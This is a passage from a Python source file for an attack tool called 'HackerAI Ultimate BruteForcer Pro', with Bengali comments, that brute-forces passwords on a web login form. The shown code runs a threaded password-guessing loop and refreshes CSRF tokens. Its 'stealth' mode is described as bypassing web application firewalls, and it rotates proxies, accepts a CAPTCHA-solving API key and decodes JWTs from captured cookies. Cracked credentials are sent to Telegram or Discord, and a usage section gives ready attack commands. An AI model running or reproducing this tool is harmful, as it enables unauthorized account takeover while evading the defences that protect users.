                self.result.total_attempts += 1
                self.attempted_passwords.add(password)
            
            # স্মার্ট ডিটেকশন
            if SmartDetector.analyze_response(resp, self.result):
                with self.lock:
                    self.found = True
                    self.result.found_password = password
                    self.result.status = AttackStatus.FOUND
                    self.result.success_url = resp.url
                    self.result.cookies = dict(resp.cookies)
                    self.result.response_headers = dict(resp.headers)
                    
                    # JWT চেক
                    jwt_data = JWTDecoder.extract_from_cookies(dict(resp.cookies))
                    if jwt_data:
                        logging.info(f"[+] 🔑 JWT টোকেন ডিকোড করা হয়েছে!")
                        for key, val in jwt_data.items():
                            if key.lower() not in ("password", "secret", "key"):
                                logging.info(f"[+]   {key}: {val}")
                
                return True
            
            # স্ট্যাটাস ফিডব্যাক
            keywords_hint = ""
            if self.result.matched_keywords:
                keywords_hint = f" | Matched: {self.result.matched_keywords[0]}"
            
            progress = f"[{self.result.total_attempts}/{len(self.wordlist)}]"
            logging.info(f"{progress} ❌ {password} (Status: {resp.status_code}){keywords_hint}")
            
            # ক্যাপচা ডিটেক্ট
            if "captcha" in resp.text.lower() or "recaptcha" in resp.text.lower():
                logging.warning("⚠️  ক্যাপচা ডিটেক্ট করা হয়েছে! ডিলে বাড়ানো হচ্ছে...")
                time.sleep(10)
            
        except Exception as e:
            logging.warning(f"[-] Error for '{password}': {e}")
        
        return False
    
    def run(self) -> AttackResult:
        """
        মেইন অ্যাটাক লুপ চালায়
        
        Returns: AttackResult (সফল/ব্যর্থ তথ্যসহ)
        """
        self.prepare()
        
        self.start_time = time.time()
        self.result.status = AttackStatus.RUNNING
        
        # ফিল্টার — বাদ দেওয়া পাসওয়ার্ড বাদ
        todo = [p for p in self.wordlist if p not in self.attempted_passwords]
        
        if not todo:
            logging.warning("[-] সব পাসওয়ার্ড ইতিমধ্যেই ট্রাই করা হয়েছে!")
            self.result.status = AttackStatus.COMPLETED
            self.result.total_time = time.time() - self.start_time
            return self.result
        
        # ── থ্রেডপুল ──
        logging.info(f"[*] 🎯 অ্যাটাক শুরু! {len(todo)} টি পাসওয়ার্ড বাকি...\n")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            
            for i, pwd in enumerate(todo):
                if self.found:
                    break
                
                # প্রতি ১০ টি রিকোয়েস্ট পর CSRF রিফ্রেশ
                if i % 10 == 0:
                    self._refresh_csrf()
                
                # স্টিলথ মোডে র্যান্ডম স্প্রেড
                if self.stealth:
                    time.sleep(random.uniform(0.1, 0.5))
                else:
                    time.sleep(self.base_delay)
                
                future = executor.submit(self._try_password, pwd)
                futures[future] = pwd
                
                # যদি স্টিলথ না হয়, একটু গ্যাপ দাও
                if not self.stealth and i % (self.threads * 2) == 0:
                    time.sleep(0.5)
            
            # ফলাফল কালেক্ট
            for future in as_completed(futures):
                if self.found:
                    # বাকি ফিউচার ক্যান্সেল
                    break
                try:
                    future.result()
                except Exception as e:
                    pass
        
        # ── ফাইনাল ──
        elapsed = time.time() - self.start_time
        self.result.total_time = elapsed
        
        if not self.found:
            self.result.status = AttackStatus.COMPLETED
            logging.info(f"\n{'='*60}")
            logging.info("[-] ❌ তালিকার কোনো পাসওয়ার্ডই কাজ করেনি।")
            logging.info(f"{'='*60}\n")
        
        # ── রিপোর্ট ──
        self._generate_report()
        
        # ── নোটিফিকেশন ──
        if self.found:
            self._send_notification()
        
        # ── রিজিউম ফাইল ──
        if self.resume_file:
            try:
                with open(self.resume_file, "w") as f:
                    for pwd in self.attempted_passwords:
                        f.write(pwd + "\n")
                logging.info(f"[+] রিজিউম ফাইল আপডেট: {self.resume_file}")
            except Exception as e:
                logging.warning(f"[-] রিজিউম ফাইল সেভ করতে সমস্যা: {e}")
        
        return self.result
    
    def _generate_report(self):
        """রিপোর্ট জেনারেট করে"""
        if self.output_file:
            if self.output_file.endswith(".json"):
                ReportGenerator.save_json(self.result, self.output_file)
            elif self.output_file.endswith(".csv"):
                ReportGenerator.save_csv(self.result, self.output_file)
            else:
                ReportGenerator.save_json(self.result)
                ReportGenerator.save_csv(self.result)
        
        # সাকসেস প্রিন্ট
        if self.found:
            print(f"""
╔══════════════════════════════════════════════════╗
║              ✅ SUCCESS!                         ║
╠══════════════════════════════════════════════════╣
║  🎯 Target    : {self.target[:50]:<50} ║
║  📧 Email     : {self.email:<50} ║
║  🔑 Password  : {self.result.found_password:<50} ║
║  🔗 Final URL : {str(self.result.success_url)[:50]:<50} ║
║  ⏱️ Attempts  : {self.result.total_attempts:<50} ║
║  ⏲️ Time      : {self.result.total_time:.2f}s{' ' * 45}║
║  🔍 Keywords  : {', '.join(self.result.matched_keywords[:3]):<50} ║
╚══════════════════════════════════════════════════╝
            """)
    
    def _send_notification(self):
        """সফল হলে নোটিফিকেশন পাঠায়"""
        message = (
            f"✅ HackerAI BruteForcer SUCCESS!\n"
            f"Target: {self.target}\n"
            f"Email: {self.email}\n"
            f"Password: {self.result.found_password}\n"
            f"Attempts: {self.result.total_attempts}\n"
            f"Time: {self.result.total_time:.2f}s\n"
            f"URL: {self.result.success_url}"
        )
        
        if self.telegram_token and self.telegram_chat_id:
            Notifier.send_telegram(self.telegram_token, self.telegram_chat_id, message)
        
        if self.discord_webhook:
            Notifier.send_discord(self.discord_webhook, message)

# ================================================================
# CLI ইন্টারফেস
# ================================================================

def load_wordlist(filepath: str) -> List[str]:
    """ফাইল থেকে ওয়ার্ডলিস্ট লোড করে"""
    try:
        return WordlistManager.load_from_file(filepath)
    except FileNotFoundError:
        logging.error(f"❌ ফাইল পাওয়া যায়নি: {filepath}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"❌ ওয়ার্ডলিস্ট লোড করতে সমস্যা: {e}")
        sys.exit(1)

def load_proxy_list(filepath: str) -> List[str]:
    """প্রক্সি লিস্ট লোড করে"""
    proxies = []
    try:
        with open(filepath, "r") as f:
            for line in f:
                proxy = line.strip()
                if proxy and not proxy.startswith("#"):
                    proxies.append(proxy)
    except FileNotFoundError:
        logging.warning(f"[-] প্রক্সি ফাইল পাওয়া যায়নি: {filepath}")
    except Exception as e:
        logging.warning(f"[-] প্রক্সি লোড করতে সমস্যা: {e}")
    return proxies

def main():
    """মেইন এন্ট্রি পয়েন্ট — CLI আর্গুমেন্ট পার্স করে"""
    
    parser = argparse.ArgumentParser(
        description="🔥 HackerAI Ultimate BruteForcer Pro v3.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
═══════════════════════════════════════════════════╗
📌 ব্যবহারের উদাহরণ:
═══════════════════════════════════════════════════╝

  # বেসিক অ্যাটাক
  python3 hacker_brute.py -u https://example.com/login -e admin@example.com -w passwords.txt

  # মাল্টি-থ্রেডেড + ডিলে
  python3 hacker_brute.py -u https://example.com -e admin@example.com -w rockyou.txt -t 10 -d 0.5

  # প্রক্সি সহ (IP রোটেশন)
  python3 hacker_brute.py -u https://example.com/login -e test@example.com -w list.txt -p proxies.txt

  # স্টিলথ মোড (WAF বাইপাস)
  python3 hacker_brute.py -u https://target.com/login -e admin@target.com -w wordlist.txt -t 3 -d 3 --stealth

  # পাসওয়ার্ড মিউটেশন সহ (smart)
  python3 hacker_brute.py -u https://example.com -e admin@example.com -w passwords.txt --mutate --markov

  # টেলিগ্রাম নোটিফিকেশন
  python3 hacker_brute.py -u https://example.com -e admin@example.com -w list.txt --telegram-token YOUR_TOKEN --telegram-chat-id CHAT_ID

  # রিপোর্ট আউটপুট + রিজিউম
  python3 hacker_brute.py -u https://example.com -e admin@example.com -w list.txt -o report.json --resume session.txt

═══════════════════════════════════════════════════╗
⚠️  শুধুমাত্র অনুমোদিত পেনিট্রেশন টেস্টিং-এর জন্য!
╚══════════════════════════════════════════════════╝
        """,
    )
    
    # বেসিক অপশন
    parser.add_argument("-u", "--url", required=True, help="🎯 টার্গেট লগইন URL")
    parser.add_argument("-e", "--email", required=True, help="📧 টার্গেট ইমেইল / ইউজারনেম")
    parser.add_argument("-w", "--wordlist", required=True, help="📝 ওয়ার্ডলিস্ট ফাইল (প্রতি লাইনে ১টি)")
    
    # পারফরম্যান্স
    parser.add_argument("-t", "--threads", type=int, default=5, help="🧵 থ্রেড সংখ্যা (ডিফল্ট: 5)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="⏳ প্রতি রিকোয়েস্টের পর ডিলে (ডিফল্ট: 1.0s)")
    
    # প্রক্সি
    parser.add_argument("-p", "--proxy-file", help="🌐 প্রক্সি ফাইল (প্রতি লাইনে ১টি, http/socks5://IP:PORT)")
    
    # মোড
    parser.add_argument("--stealth", action="store_true", help="🥷 স্টিলথ মোড (জিটার + লং ডিলে + WAF বাইপাস)")
    parser.add_argument("--headless", action="store_true", help="🖥️  হেডলেস ব্রাউজার মোড (Selenium)")
    
    # স্মার্ট ফিচার
    parser.add_argument("--mutate", action="store_true", help="🧬 পাসওয়ার্ড মিউটেশন চালু (leet, ক্যাপিটাল, নাম্বার)")
    parser.add_argument("--markov", action="store_true", help="🤖 মার্কভ চেইন পাসওয়ার্ড জেনারেটর")
    
    # ক্যাপচা
    parser.add_argument("--captcha-api-key", help="🔐 2Captcha / RuCaptcha API কী")
    
    # নোটিফিকেশন
    parser.add_argument("--telegram-token", help="📱 টেলিগ্রাম বট টোকেন")
    parser.add_argument("--telegram-chat-id", help="📱 টেলিগ্রাম চ্যাট ID")
    parser.add_argument("--discord-webhook", help="💬 ডিসকর্ড ওয়েবহুক URL")
    
    # আউটপুট
    parser.add_argument("-o", "--output", help="📄 আউটপুট ফাইল (.json / .csv)")
    parser.add_argument("--resume", help="💾 রিজিউম ফাইল (অ্যাটাক পজ/রিজিউম)")
    
    # ডিবাগ
    parser.add_argument("--debug", action="store_true", help="🔧 ডিবাগ মোড (verbose)")
    
    args = parser.parse_args()
    
    # ── লগিং সেটআপ ──
    log_level = logging.DEBUG if args.debug else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
        handlers=[
            logging.StreamHandler(),
        ],
    )
    
    # ── ব্যানার ──
    print(BANNER)
    logging.info(f"[*] টার্গেট: {args.url}")
    logging.info(f"[*] ইমেইল: {args.email}")
    print()
    
    # ── ওয়ার্ডলিস্ট ──
    passwords = load_wordlist(args.wordlist)
    logging.info(f"[+] মোট {len(passwords)} টি পাসওয়ার্ড লোড হয়েছে")
    
    # ── প্রক্সি ──
    proxies = []
    if args.proxy_file:
        proxies = load_proxy_list(args.proxy_file)
        if proxies:
            logging.info(f"[+] {len(proxies)} টি প্রক্সি লোড হয়েছে")
        else:
            logging.warning("[-] কোনো প্রক্সি পাওয়া যায়নি, প্রক্সি ছাড়া চলবে")
    
    # ── ব্রুটফোর্সার তৈরি ──
    forcer = HackerBruteForcer(
        target=args.url,
        email=args.email,
        wordlist=passwords,
        threads=args.threads,
        delay=args.delay,
        proxy_list=proxies,
        stealth=args.stealth,
        use_headless=args.headless,
        captcha_api_key=args.captcha_api_key,
        telegram_token=args.telegram_token,
        telegram_chat_id=args.telegram_chat_id,
        discord_webhook=args.discord_webhook,
        output_file=args.output,
        resume_file=args.resume,
        mutate_passwords=args.mutate,
        generate_markov=args.markov,
    )
    
    # ── রান ──
    try:
        result = forcer.run()
    except KeyboardInterrupt:
        print("\n\n⚠️  ইউজার দ্বারা বন্ধ করা হয়েছে!")
        if forcer.result.total_attempts > 0:
            logging.info(f"[*] মোট {forcer.result.total_attempts} টি পাসওয়ার্ড ট্রাই হয়েছে")
            if forcer.result.found_password:
                logging.info(f"[+] ✅ ফাউন্ড: {forcer.result.found_password}")
        sys.exit(0)
    except Exception as e:
        logging.error(f"❌ ক্রিটিকাল এরর: {e}")
        import traceback
        if args.debug:
            traceback.print_exc()
        sys.exit(1)
    
    # ── এক্সিট ──
    if result.status in (AttackStatus.FOUND, AttackStatus.COMPLETED):
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()